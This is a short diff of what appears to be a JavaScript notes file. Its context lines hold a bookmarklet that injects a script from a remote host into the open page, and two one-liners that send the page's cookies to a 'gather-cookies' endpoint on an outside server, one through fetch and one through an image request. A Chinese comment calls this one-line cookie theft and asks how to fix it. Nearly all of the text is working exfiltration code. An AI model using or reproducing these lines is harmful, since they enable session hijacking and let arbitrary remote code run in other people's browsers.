@@ -25,6 +25,7 @@ javascript:(()=>{
 
 
 //保存为书签使用
+
 javascript:(()=>{ let script=document.createElement('script');script.setAttribute('src','https://frontend-inject.xieyaokun.com/main.js'), script.setAttribute('type','application/javascript'),script.setAttribute('charset','utf-8'),document.body.appendChild(script) })();
 
 // 一句话偷窃你的cookie ,怎么解决这个问题呢？
@@ -34,3 +35,4 @@ fetch('https://test.proxy.xiaoshuogeng.com/gather-cookies?cookies='+encodeURICom
 // or
 
 (new Image(100, 200)).setAttribute('src','https://test.proxy.xiaoshuogeng.com/gather-cookies?cookies='+encodeURIComponent(document.cookie));
+
